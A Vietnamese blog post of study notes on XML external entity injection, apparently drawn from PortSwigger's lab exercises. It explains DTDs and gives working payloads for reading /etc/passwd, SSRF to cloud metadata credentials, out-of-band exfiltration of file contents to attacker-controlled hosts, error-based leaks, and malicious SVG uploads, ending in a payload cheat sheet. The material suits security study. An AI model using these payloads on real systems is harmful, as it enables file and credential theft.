---
layout: post
title: "XXE injection"
render_with_liquid: false
categories:
  - Web Security
  - PortSwigger
tags:
  - portswigger
  - xxe-injection
source_collection: notion_portswigger
---
XML external entity injection (XXE) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng. Nó thường cho phép kẻ tấn công xem các tệp trên hệ thống tệp của máy chủ ứng dụng, và tương tác với bất kỳ hệ thống phụ trợ hoặc bên ngoài nào mà bản thân ứng dụng có thể truy cập.

Trong một số trường hợp, kẻ tấn công có thể leo thang cuộc tấn công XXE để xâm phạm máy chủ cơ bản hoặc cơ sở hạ tầng phụ trợ khác bằng cách tận dụng lỗ hổng XXE để thực hiện các cuộc tấn công giả mạo yêu cầu phía máy chủ (SSRF).

## Lỗ hổng XXE phát sinh như thế nào?

Một số ứng dụng sử dụng định dạng XML để truyền dữ liệu giữa trình duyệt và máy chủ. Các ứng dụng thực hiện việc này hầu như luôn sử dụng thư viện chuẩn hoặc API nền tảng để xử lý dữ liệu XML trên máy chủ. Lỗ hổng XXE phát sinh do đặc tả XML chứa nhiều tính năng nguy hiểm tiềm tàng và các trình phân tích cú pháp tiêu chuẩn hỗ trợ các tính năng này ngay cả khi chúng thường không được ứng dụng sử dụng.

## DTD Internal & DTD External

**Internal DTD**

Internal DTD được định nghĩa ngay trong tài liệu XML. Tất cả các khai báo DTD được đặt trong phần `&lt;!DOCTYPE&gt;` ở đầu tài liệu XML.

**Ví dụ về Internal DTD:**

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

**External DTD**

External DTD được định nghĩa trong một file riêng biệt và được tham chiếu trong tài liệu XML. External DTD có thể được tham chiếu bằng hệ thống tệp (SYSTEM) hoặc qua một URL (PUBLIC).

**Ví dụ về External DTD sử dụng SYSTEM:**
File `note.dtd`:

```xml
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

File XML tham chiếu tới `note.dtd`:

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

## Các loại tấn công XXE là gì?

Có 4 kiểu tấn công XXE sau:

[**Exploiting XXE to retrieve files**](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files) : trong đó một thực thể bên ngoài được xác định có chứa nội dung của tệp và được trả về trong phản hồi của ứng dụng.

Để thực hiện cuộc tấn công chèn XXE nhằm truy xuất một tệp tùy ý từ hệ thống tệp của máy chủ, cần sửa đổi XML đã gửi theo hai cách:

- C1: Thêm hoặc chỉnh sửa phần tử **DOCTYPE** xác định thực thể bên ngoài chứa đường dẫn đến tệp.
- C2: Chỉnh sửa giá trị dữ liệu trong XML được trả về trong phản hồi của ứng dụng để sử dụng thực thể bên ngoài đã xác định.

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```

Giải thích:

1. &lt;!DOCTYPE foo ...&gt;
    - Khai báo kiểu tài liệu (Document Type Declaration).
    - `foo` là tên của kiểu tài liệu.
2. &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; : Định nghĩa một thực thể bên ngoài (External Entity) tham chiếu đến tệp tin `/etc/passwd`.
    - `xxe` là tên của thực thể.
    - `SYSTEM` chỉ ra rằng thực thể này tham chiếu đến một **nguồn bên ngoài**.
    - **Nguồn bên ngoài**: Có thể là một tệp tin, một URL, hoặc một tài nguyên mạng khác. Trong trường hợp của ví dụ trên, nguồn bên ngoài là tệp tin `/etc/passwd` trên hệ thống file của máy tính.
    - `"file:///etc/passwd"` là đường dẫn đến file hệ thống
3. **`&xxe;`** là một tham chiếu đến thực thể `xxe` được định nghĩa trước đó, khi parser gặp `&xxe;`, nó sẽ thay thế `&xxe;` bằng nội dung của tệp tin `/etc/passwd` (nếu parser cho phép và có quyền truy cập).

[**Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) :** trong đó một thực thể bên ngoài được xác định dựa trên URL tới hệ thống phụ trợ internal.

Ngoài việc lấy dữ liệu nhạy cảm, tác động chính khác của các cuộc tấn công XXE là chúng có thể được sử dụng để thực hiện giả mạo yêu cầu phía máy chủ (SSRF). Đây là một lỗ hổng nghiêm trọng tiềm ẩn trong đó ứng dụng phía máy chủ có thể bị lợi dụng để thực hiện các yêu cầu HTTP tới bất kỳ URL nào mà máy chủ có thể truy cập.

Để khai thác lỗ hổng XXE nhằm thực hiện cuộc tấn công SSRF, bạn cần xác định một thực thể XML bên ngoài bằng URL mà bạn muốn nhắm mục tiêu. Nếu bạn có thể sử dụng thực thể đã xác định trong giá trị dữ liệu được trả về trong phản hồi của ứng dụng thì bạn sẽ có thể xem phản hồi từ URL trong phản hồi của ứng dụng và do đó có được sự tương tác hai chiều với hệ thống phụ trợ. Nếu không, bạn sẽ chỉ có thể thực hiện các cuộc tấn công  [blind SSRF](https://portswigger.net/web-security/ssrf/blind) (vẫn có thể gây ra hậu quả nghiêm trọng).

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck>
	<productId>
		&ssrf;
	</productId>
	<storeId>1</storeId>
</stockCheck>
```

![Untitled](/assets/img/portswigger/xxe-injection/Untitled.png)

[**Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band) (`Blind XXE`)**: nơi dữ liệu nhạy cảm được truyền từ máy chủ ứng dụng đến hệ thống mà kẻ tấn công kiểm soát

**What is blind XXE?**

Lỗ hổng XXE mù phát sinh khi ứng dụng dễ bị tiêm XXE nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào được xác định trong phản hồi của nó. Điều này có nghĩa là không thể truy xuất trực tiếp các tệp phía máy chủ và do đó, XXE mù thường khó khai thác hơn các lỗ hổng XXE thông thường.

Có hai cách chính để bạn có thể tìm và khai thác các lỗ hổng XXE ẩn:

- Bạn có thể kích hoạt các tương tác mạng out-of-band, đôi khi lọc dữ liệu nhạy cảm trong dữ liệu tương tác.
- Bạn có thể kích hoạt các lỗi phân tích cú pháp XML theo cách các thông báo lỗi chứa dữ liệu nhạy cảm

**Detecting blind XXE using out-of-band (OAST) techniques**

Thường có thể phát hiện XXE mù bằng cách sử dụng kỹ thuật tương tự như đối với các cuộc tấn công XXE SSRF nhưng kích hoạt tương tác mạng ngoài băng tần với hệ thống mà bạn kiểm soát

![Untitled](/assets/img/portswigger/xxe-injection/Untitled%201.png)

```coffeescript
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY oast SYSTEM "https://l8uxtjdc0xvr0e23nbmduo5ypyvgj67v.oastify.com"> ]>
<stockCheck>
    <productId>&oast;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Điều này cho thấy có thể kích hoạt tương tác với miền bên ngoài.

Đôi khi, các cuộc tấn công XXE sử dụng các thực thể thông thường bị chặn do một số xác thực đầu vào của ứng dụng hoặc việc tăng cường trình phân tích cú pháp XML đang được sử dụng.

Trong trường hợp này, bạn có thể sử dụng các **thực thể tham số XML** để thay thế. 

**Các thực thể tham số XML** là một loại thực thể XML đặc biệt chỉ có thể được tham chiếu ở nơi khác trong DTD. 

Vì mục đích hiện tại, bạn chỉ cần biết hai điều:

- Đầu tiên, việc khai báo một thực thể tham số XML bao gồm ký tự phần trăm trước tên thực thể:
    
    ```jsx
    <!ENTITY % myparameterentity "my parameter entity value" >
    
    ```
    
- Thứ hai, các thực thể tham số được tham chiếu bằng ký tự phần trăm(%) thay vì ký hiệu và(&):
    
    ```
    %myparameterentity;
    ```
    

Điều này có nghĩa là bạn có thể kiểm tra XXE mù bằng cách sử dụng tính năng phát hiện ngoài băng tần thông qua các thực thể tham số XML như sau:

```jsx
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

**`&lt;!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt;`**:

- Định nghĩa một thực thể tham chiếu bên ngoài.
- `%` chỉ ra rằng đây là một thực thể tham chiếu kiểu `parameter entity` (thực thể tham số), thường được sử dụng trong nội dung của định nghĩa DTD.
- `xxe` là tên của thực thể.
- `SYSTEM` chỉ ra rằng thực thể này tham chiếu đến một nguồn bên ngoài, trong trường hợp này là một URL.

**`%xxe;`**:

- Sử dụng thực thể vừa được định nghĩa (`xxe`).
- Khi parser gặp `%xxe;`, nó sẽ truy cập URL `"http://f2g9j7hhkax.web-attacker.com"` và thay thế `%xxe;` bằng nội dung mà nó nhận được từ URL đó.

![Untitled](/assets/img/portswigger/xxe-injection/Untitled%202.png)

[**Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) (**[error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) **`Blind XXE`)**: nơi kẻ tấn công có thể kích hoạt thông báo lỗi phân tích cú pháp chứa dữ liệu nhạy cảm.

Nếu ứng dụng trả về thông báo lỗi trong phản hồi của nó ta có thế khai thác XXE mù là kích hoạt lỗi phân tích cú pháp XML trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn truy xuất. 

```jsx
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

DTD này thực hiện các bước sau:

- Định nghĩa một thực thể tham số XML được gọi là `file`, chứa nội dung của tệp `/etc/passwd`
- Định nghĩa một thực thể tham số XML được gọi là `eval` được gán bằng một thực thể tham số XML khác được gọi là `error` . Thực thể `error` sẽ được gán bằng cách tải một tệp không tồn tại có tên chứa giá trị của thực thể `file`.
- Sử dụng thực thể `%eval;` để thực hiện khai báo động của thực thể `error`.
- Sử dụng thực thể `%error;` để giá trị của nó được gán bằng cách thử tải tệp không tồn tại, dẫn đến thông báo lỗi chứa tên của tệp không tồn tại và kèm theo nội dung của tệp `/etc/passwd` được đưa ra thông báo cùng

[**Exploiting blind XXE by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd) (`Blind XXE`): Khai thác XXE mù bằng cách tái sử dụng DTD cục bộ**

Kỹ thuật trước hoạt động tốt với DTD bên ngoài, nhưng thông thường nó sẽ không hoạt động với DTD bên trong được chỉ định đầy đủ trong phần tử DOCTYPE. Điều này là do kỹ thuật này liên quan đến việc sử dụng một thực thể tham số XML trong định nghĩa của một thực thể tham số khác. Theo đặc tả XML, điều này được phép trong các DTD bên ngoài nhưng không được phép trong các DTD bên trong. (Một số trình phân tích cú pháp có thể chấp nhận được điều đó, nhưng nhiều trình phân tích thì không.)

Vậy còn lỗ hổng XXE mù khi các tương tác ngoài băng tần bị chặn thì sao? Bạn không thể lọc dữ liệu qua kết nối ngoài băng tần và bạn không thể tải DTD bên ngoài từ máy chủ từ xa.?

Trong trường hợp này, vẫn có thể kích hoạt các thông báo lỗi chứa dữ liệu nhạy cảm do lỗ hổng trong đặc tả ngôn ngữ XML. Nếu DTD của tài liệu sử dụng kết hợp các khai báo DTD bên trong và bên ngoài, thì DTD bên trong có thể định nghĩa lại các thực thể được khai báo trong DTD bên ngoài. Khi điều này xảy ra, hạn chế về việc sử dụng một thực thể tham số XML trong định nghĩa của một thực thể tham số khác sẽ được nới lỏng.

Điều này có nghĩa là kẻ tấn công có thể sử dụng kỹ thuật XXE dựa trên lỗi từ bên trong DTD nội bộ, miễn là thực thể tham số XML mà chúng sử dụng đang xác định lại thực thể được khai báo trong DTD bên ngoài. Tất nhiên, nếu các kết nối ngoài băng tần bị chặn thì DTD bên ngoài không thể được tải từ một vị trí ở xa. Thay vào đó, nó cần phải là một tệp DTD bên ngoài cục bộ trên máy chủ ứng dụng.

Ví dụ: giả sử có tệp DTD trên hệ thống tệp máy chủ tại vị trí `/usr/local/app/schema.dtd` và file DTD này định nghĩa một thực thể tên là `custom_entity` . Kẻ tấn công có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung của tệp `/etc/passwd` bằng cách gửi một DTD giống như sau:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % entity_in_schema '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

DTD này thực hiện các bước sau:

- Định nghĩa một thực thể tham số XML có tên `local_dtd`, chứa nội dung của tệp DTD bên ngoài tồn tại trên hệ thống tệp máy chủ.
- Định nghĩa lại thực thể tham số XML được gọi là `entity_in_schema` đã được định nghĩa trong tệp DTD bên ngoài `schema.dtd`. Thực thể được xác định lại này có chứa [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) được mô tả để kích hoạt thông báo lỗi chứa nội dung của tệp `/etc/passwd`.
- Sử dụng thực thể `local_dtd` để diễn giải DTD bên ngoài, bao gồm giá trị được xác định lại của thực thể `entity_in_schema`. Điều này dẫn đến thông báo lỗi mong muốn.
- Khi trình Parser gặp `%local_dtd;` nó sẽ tham chiếu đến file `schema.dtd` và load ra các thực thể có trong file đó, và vì vậy thực thể `entity_in_schema` cũng được load ra. Và 1 lần nữa khi trình Parser gặp `&#x25;eval;` và `&#x25;error;`  nó sẽ thực hiện [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)

`*Cách định vị tệp DTD trong server hiện có để có thể sử dụng lại thực thể trong DTD*`

Vì cuộc tấn công XXE này liên quan đến việc tái sử dụng một DTD hiện có trên hệ thống tệp máy chủ, nên yêu cầu chính là xác định vị trí tệp phù hợp. Điều này thực sự khá đơn giản. Bởi vì ứng dụng trả về bất kỳ thông báo lỗi nào được trình phân tích cú pháp XML đưa ra, bạn có thể dễ dàng liệt kê các tệp DTD cục bộ chỉ bằng cách thử tải chúng từ bên trong DTD nội bộ.

Ví dụ: các hệ thống Linux sử dụng môi trường máy tính để bàn Gnome thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd` . Bạn có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi tải trọng XXE sau, điều này sẽ gây ra lỗi nếu thiếu tệp:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Sau khi bạn đã kiểm tra danh sách các tệp DTD phổ biến để định vị một tệp hiện có, bạn cần lấy một bản sao của tệp và xem lại nó để tìm một thực thể mà bạn có thể xác định lại. Vì nhiều hệ thống phổ biến bao gồm các tệp DTD là nguồn mở nên thông thường bạn có thể nhanh chóng có được bản sao của tệp thông qua tìm kiếm trên internet.

Ví dụ

`Bước 1:` Xác định 1 DTD ngoài có trên hệ thống. 

Các hệ thống Linux sử dụng môi trường desktop Gnome thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd` chứa một thực thể gọi là `ISOamso`

- Nếu response lỗi ⇒ DTD này không có trên hệ thống
    
    ![Untitled](/assets/img/portswigger/xxe-injection/Untitled%203.png)
    
- Nếu response không lỗi ⇒ DTD này không có trên hệ thống
    
    ![Untitled](/assets/img/portswigger/xxe-injection/Untitled%204.png)
    

`Bước 2:` Sau khi đã xác định được DTD ngoài, tiến hành tìm 1 `ENTITY` trong DTD đó để định nghĩa lại

Kỹ thuật tìm kiếm `ENTITY` trong `DTD` sẽ được bổ sung sau

Các hệ thống Linux sử dụng môi trường desktop Gnome thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd` chứa một thực thể gọi là `ISOamso`

Vậy ta tạm xác định có 1 `ENTITY` là `ISOamso`

`Bước 3:` Tiến hành định nghĩa lại `ENTITY ISOamso` để gây ra lỗi [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)

`Lưu ý:` Trong cú pháp xml, cặp dấu `''` bao ngoài cặp dấu `""``

```xml
<!DOCTYPE foo [
<!ENTITY % load_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexist/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%load_dtd;
]>
```

![Untitled](/assets/img/portswigger/xxe-injection/Untitled%205.png)

[**Tìm bề mặt tấn công ẩn để tiêm XXE](https://portswigger.net/web-security/xxe#finding-hidden-attack-surface-for-xxe-injection) (**`XInclude`**)**

Bề mặt tấn công của các lỗ hổng chèn XXE là hiển nhiên trong các trường hợp HTTP request của ứng dụng bao gồm dữ liệu ở định dạng XML. Trong các trường hợp khác, bề mặt tấn công ít được nhìn thấy hơn. Tuy nhiên, nếu tìm đúng chỗ, bạn sẽ thấy bề mặt tấn công XXE trong các yêu cầu không chứa bất kỳ XML nào.

- **XInclude attacks to retrieve file**
    
    Một số ứng dụng nhận dữ liệu do khách hàng gửi, nhúng nó ở phía máy chủ vào một tài liệu XML và sau đó phân tích tài liệu. Một ví dụ về điều này xảy ra khi dữ liệu do khách hàng gửi được đặt vào yêu cầu SOAP back-end, sau đó được xử lý bởi dịch vụ SOAP backend
    
    Trong tình huống này, bạn không thể thực hiện cuộc tấn công XXE cổ điển, vì bạn không kiểm soát toàn bộ tài liệu XML và do đó không thể xác định hoặc sửa đổi phần tử `DOCTYPE`. Tuy nhiên, bạn có thể sử dụng `XInclude` thay thế.
    
    `XInclude` là một phần của đặc tả XML cho phép xây dựng một tài liệu XML từ các tài liệu phụ.
    
    Bạn có thể thực hiện một cuộc tấn công `XInclude` bên trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, vì vậy cuộc tấn công có thể được thực hiện trong trường hợp bạn chỉ cần kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy chủ.
    
    Để thực hiện một cuộc tấn công `XInclude`, bạn cần tham chiếu không gian tên `XInclude` và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. Ví dụ:
    
    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    ```
    
    `&lt;foo xmlns:xi="`http://www.w3.org/2001/XInclude`"&gt;`
    
    - `&lt;foo&gt;`: Đây là phần tử gốc của tài liệu XML này, chứa khai báo không gian tên này, áp dụng cho toàn bộ nội dung bên trong nó.
    - URL `http://www.w3.org/2001/XInclude` là không gian tên (namespace) cho tiêu chuẩn XInclude của W3C. Tiêu chuẩn XInclude (XML Inclusions) được định nghĩa bởi W3C (World Wide Web Consortium) để cung cấp một cơ chế mạnh mẽ cho phép bao gồm nội dung từ các tài liệu XML khác vào một tài liệu XML hiện tại.
    - `xmlns:xi="http://www.w3.org/2001/XInclude"`khai báo rằng các phần tử có tiền tố `xi` sẽ thuộc về không gian tên XInclude.
    
    **`&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;`**
    
    - `&lt;xi:include&gt;`: Đây là một phần tử thuộc không gian tên XInclude (`xi`). XInclude là một tiêu chuẩn của W3C dùng để bao gồm (include) nội dung từ một nguồn khác vào tài liệu XML hiện tại.
    - `parse="text"`: Thuộc tính `parse` xác định cách thức nội dung của tài liệu được xử lý. Ở đây, giá trị `text` có nghĩa là nội dung sẽ được bao gồm dưới dạng văn bản thuần túy (plain text), không phải là XML.
    - `href="file:///etc/passwd"`: Thuộc tính `href` chỉ định đường dẫn đến tệp mà bạn muốn bao gồm. Trong trường hợp này, nó chỉ đến tệp `/etc/passwd` trên hệ thống tệp cục bộ.
    
    **Tác dụng cụ thể**:
    
    - Khi tài liệu XML này được xử lý bởi một trình phân tích hỗ trợ XInclude, nội dung của tệp `/etc/passwd` sẽ được nạp và chèn vào vị trí của phần tử `&lt;xi:include&gt;`.
    - Nội dung được bao gồm sẽ được xử lý như văn bản thuần túy, nghĩa là nó sẽ không được phân tích cú pháp như XML.
    
    Ví dụ, giả sử tệp `/etc/passwd` có nội dung như sau (đây là một phần của tệp `/etc/passwd` trên hệ thống Unix/Linux, chứa thông tin về người dùng):
    
    ```xml
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ...
    ```
    
    Sau khi xử lý XInclude, tài liệu XML sẽ trông như sau:
    
    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        ...
    </foo>
    ```
    
- **XInclude attacks via image file upload**
    
    Một số ứng dụng cho phép người dùng tải lên các tệp sau đó được xử lý phía máy chủ. Một số định dạng tệp phổ biến sử dụng XML hoặc chứa các thành phần phụ XML. Ví dụ về các định dạng dựa trên XML là các định dạng tài liệu văn phòng như DOCX và các định dạng hình ảnh như SVG.
    
    Ví dụ: một ứng dụng có thể cho phép người dùng tải hình ảnh lên và xử lý hoặc xác thực những hình ảnh này trên máy chủ sau khi chúng được tải lên. Ngay cả khi ứng dụng mong muốn nhận được định dạng như PNG hoặc JPEG, thư viện xử lý hình ảnh đang được sử dụng có thể hỗ trợ hình ảnh SVG. Vì định dạng SVG sử dụng XML nên kẻ tấn công có thể gửi hình ảnh SVG độc hại và do đó tiếp cận bề mặt tấn công ẩn để tìm lỗ hổng XXE.
    
    ```xml
    Content-Disposition: form-data; name="avatar"; filename="XIncludeViaImageUpLoad.svg"
    Content-Type: image/svg+xml
    
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ```
    
    Về cơ bản payload này tạo ra 1 SVG kèm theo 1 đoạn XML, giá trị của chữ trong svg được tham chiếu vào file /etc/passwd
    
    Đây là kết quả sau khi upload
    
    ![Untitled](/assets/img/portswigger/xxe-injection/Untitled%206.png)
    
- Các bước test
    
    **Modified content type**
    
    Hầu hết các yêu cầu POST sử dụng loại nội dung mặc định được tạo bởi các biểu mẫu HTML, chẳng hạn như application/x-www-form-urlencoded. Một số trang web mong muốn nhận được yêu cầu ở định dạng này nhưng sẽ chấp nhận các loại nội dung khác, bao gồm cả XML.
    
    ```jsx
    Ví dụ: nếu một yêu cầu bình thường có nội dung sau:
    POST /action HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 7
    
    foo=bar
    Sau đó, bạn có thể gửi yêu cầu sau với kết quả tương tự:
    POST /action HTTP/1.0
    Content-Type: text/xml
    Content-Length: 52
    
    <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
    hoặc
    POST /action HTTP/1.0
    Content-Type: application/xml
    Content-Length: 52
    
    <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
    ```
    
    Retrieve File
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root>
    <name>&xxe;</name>
    </root>
    ```
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
    <stockCheck>
    	<productId>1&xxe;</productId>
    	<storeId>1</storeId>
    </stockCheck>
    ```
    
    Detect Bằng Out Of Band
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://d0evt6r34r3obt2zezpsmstv2m8dw3ks.oastify.com">]>
    <stockCheck>
    	<productId>1&xxe;</productId>
    	<storeId>1</storeId>
    </stockCheck>
    Hoặc nếu bị filter
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://d0evt6r34r3obt2zezpsmstv2m8dw3ks.oastify.com">
    %xxe;
    ]>
    <stockCheck>
    	<productId>1</productId>
    	<storeId>1</storeId>
    </stockCheck>
    ```
    
    Lấy dữ liệu bằng sử dụng External DTD 
    
    ```xml
    <!-- Server lưu trữ DTD -->
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval '<!ENTITY &#x25; data SYSTEM "https://okcfxafewa4z4jt57la5zjh09rfi39ry.oastify.com/?x=%file;">'>
    %eval;
    %data;
    <!-- Load DTD -->
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
    	<!ENTITY % xxe SYSTEM "https://exploit-0a37009803c8d79380afac91013000d3.exploit-server.net/exploit">
    	%xxe;
    ]>
    <stockCheck>
    	<productId>2</productId>
    	<storeId>1</storeId>
    </stockCheck>
    ```
    
    Lấy dữ liệu bằng cách kích lỗi
    
    ```xml
    <!-- Server lưu trữ DTD -->
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval '<!ENTITY &#x25; error SYSTEM "file://nonexist/%file;">'>
    %eval;
    %error;
    <!-- Load DTD -->
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
    	<!ENTITY % xxe SYSTEM "https://exploit-0a8a0043044d743780b8200a0122003d.exploit-server.net/exploit">
    	%xxe;
    ]>
    <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
    ```
    
    XInclude To Retrieve File
    
    ![Untitled](/assets/img/portswigger/xxe-injection/Untitled%207.png)
    
    ```xml
    productId=<@urlencode><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo><@/urlencode>&storeId=1
    ```
    
    XInclude Via Image Upload File
    
    ```xml
    Content-Disposition: form-data; name="avatar"; filename="XIncludeViaImageUpLoad.svg"
    Content-Type: image/svg+xml
    
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
    <svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="20" x="0" y="20">&xxe;</text>
    </svg>
    ```
